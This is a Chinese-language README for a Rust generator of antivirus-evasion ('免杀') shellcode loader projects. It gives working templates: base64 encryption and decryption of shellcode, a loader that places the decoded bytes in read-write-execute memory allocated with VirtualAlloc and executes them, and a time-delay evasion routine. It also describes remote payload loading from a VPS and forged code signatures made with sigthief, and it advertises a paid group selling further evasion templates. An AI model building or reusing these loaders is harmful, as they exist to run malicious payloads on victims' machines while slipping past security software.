## rust免杀项目生成器beta-0.0.2

此版本仅用于测试！生成项目会包含本地调试信息，请勿实战！

### 简介

本项目旨在实现免杀模板动态化、私有化，而不是直接提供一键生成免杀项目，需要使用人员本身具有一定的rust语言基础。

通过模块化一个完整loader的各个功能，自动组装模块生成免杀项目；通过模块导入功能实现模块私有化，增加loader寿命。

### 编译环境

`rustc 1.83.0 (90b35a623 2024-11-26)`

### 项目结构

```
config:包含用户导入模板以及部分默认功能模板
output：项目输出
output.log:日志方便排查问题
```

### 项目功能

运行主程序选择相关参数，即可在`output`目录下生成rust项目

```
单体加载：生成单文件exe项目
分离加载：在项目目录下生成encryption.bin,使用时exe直接跟加密文件即可，可重命名
远程加载：填写远程加载url，在项目目录下会生成encryption.bin，然后将encryption.bin放到对应vps即可
伪造签名：利用签名复制工具sigthief实现
```

![图片](https://github.com/user-attachments/assets/97ec9519-0d73-44af-b046-e04d26a6898f)


模板导入：

该功能目前未开发模板正确性检测，因此错误模板导入可以成功，但使用该模板时会导致项目无法生成

![图片](https://github.com/user-attachments/assets/37376c5f-a61a-4a38-bbfa-742bf0361ae8)


### 模板导入说明

模板导入功能主要实现各种轮子的导入，导入模板需要满足下面内容

#### 加解密模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
base64 = "0.21"
```

加密模板：

需要导入主要代码，其中加密函数为`pub`，读取加密文件输出到`./encryption.bin`，输入文件以`#shellcodepath#`代替，注意这里需要r保证路径正确

例：	

```rust
use base64::encode;
use std::fs::File;
use std::io::{self, Read, Write};

pub fn base64_encrypt() -> io::Result<()> {
    // 硬编码的输入和输出路径
    let input_file = r"#shellcodepath#"; // 输入文件路径
    let output_file = "./encryption.bin"; // 输出文件路径

    // 读取文件内容
    let mut file = File::open(input_file)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    // 执行 base64 编码
    let encoded = encode(buffer);

    // 将编码后的数据写入输出文件
    let mut output = File::create(output_file)?;
    output.write_all(encoded.as_bytes())?;

    Ok(())
}
```

解密模板：

方法需要为`pub`方法，函数输入输出需要固定为`input_data: &[u8]`和`Vec<u8>`

```rust
use base64::decode;
use std::fs::File;
use std::io::{self, Read};

pub fn base64_decrypt_to_shellcode(input_data: &[u8]) -> Vec<u8> {
    // 将 Base64 编码的数据解码为字节数组
    decode(input_data).expect("Failed to decode Base64")
}
```

#### 加载模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
winapi = { version = "0.3.9", features = ["memoryapi", "winnt"] }
```

加载代码：

加载代码是唯一需要写main函数的模板，解密函数用`#encryption#`代替，输入字节内容用`#encryption_shellcode#`代替

```rust
use std::ptr::null_mut;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};

/// 分配可执行内存并运行 base
unsafe fn execute_base(base: &[u8]) {
    // 分配可执行内存
    let exec_mem = VirtualAlloc(
        null_mut(),
        base.len(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );

    if exec_mem.is_null() {
        panic!("Failed to allocate executable memory");
    }

    // 将 base 拷贝到分配的内存中
    std::ptr::copy_nonoverlapping(base.as_ptr(), exec_mem as *mut u8, base.len());

    // 创建指向 base 的函数指针
    let base_fn: extern "C" fn() = std::mem::transmute(exec_mem);

    // 执行 base
    base_fn();
}

fn main() {
    println!("Decoding and executing base...");

    let base_en: &[u8] =#encryption_shellcode#;
    // 解码 Base64 base
    let base = #encryption#(base_en);

    // 执行 base
    unsafe {
        execute_base(&base);
    }
}
```

#### 花指令模板和反虚拟机模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
rand = "0.8"  # 添加 rand crate 来支持随机数生成
```

代码模板：

只需要实现pub，无输入输出

```rust
use rand::Rng;
use std::{thread, time};

pub fn calculate_pi() -> f64 {
    let start_time = std::time::Instant::now();
    
    let mut inside_circle = 0;
    let total_points = 1_000_000_000;  // 总共生成的点数
    
    let mut rng = rand::thread_rng();

    // 计算直到运行大约10秒
    for i in 0..total_points {
        let x: f64 = rng.gen_range(0.0..1.0);
        let y: f64 = rng.gen_range(0.0..1.0);
        
        // 检查点是否在单位圆内
        if x * x + y * y <= 1.0 {
            inside_circle += 1;
        }

        // 检查是否达到约定的10秒
        if start_time.elapsed() >= time::Duration::new(10, 0) {
            break;
        }
    }

    // 计算圆周率
    let pi_approximation = 4.0 * (inside_circle as f64) / (total_points as f64);
    println!("近似计算的圆周率: {}", pi_approximation);
    pi_approximation
}
```

### 正确使用姿势

这里以一个加密模板例子来实现说明该工具的正确使用姿势

1、寻找自己的轮子，并测试保证项目可用

让`gpt`编写base32加解密程序
![图片](https://github.com/user-attachments/assets/739e46e0-f078-432f-8cde-25b8dd28855f)


2、修改轮子到满足模板要求

新建一个项目来修改代码满足相关要求，测试代码是否正确，代码运行正确后替换相关关键字导入

![图片](https://github.com/user-attachments/assets/447cfc43-2e4c-4b2d-86b3-44d94afa855a)


3、导入模板

修改路径为`#shellcodepath#`导入模板，会在config目录encryption内生成对应目录

![图片](https://github.com/user-attachments/assets/ee4f4bda-0203-42a1-9e59-de39a41ee394)


4、使用模板

重启主程序即可发现base32已经可以选择，此时配合加载模板和其他功能即可生成免杀项目

![图片](https://github.com/user-attachments/assets/c415671e-0932-4742-9a75-ac24cb266845)


测试生成exe发现可以加载成功
![图片](https://github.com/user-attachments/assets/f7f74140-7565-49d3-a706-e5d57651af57)


加密过程或后续木马生成中出现问题可查看output.log排查相关问题

### 注意事项

模板名称不要包含特殊字符

导入库文件时不要使用换行如下

```rust
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
```

这会导致识别失败，同一个导入只占用一行



todo：

日志功能(🐕

动态密钥功能

加载模板分类

系统架构细化处理


### 知识星球
如果你没有rust基础，我的知识星球内提供多个免杀模板和加密模板，并会持续维护，欢迎加入！
![FvbISokumgaBHU2mmKRnpV7JF7pS](https://github.com/user-attachments/assets/3faf2769-369d-4628-91a4-8c36e83035f6)
![FnFF1RzShvxKEsBAIHKmYqtDSY_r](https://github.com/user-attachments/assets/54bde3c7-1042-41eb-8936-3e8bbb20d7a5)

知识星球内容除了免杀模板后续还会更新更多红队攻防内容！
![海报](https://github.com/user-attachments/assets/402bfbb2-faf1-4ae6-a271-7b7b98573f02)




...
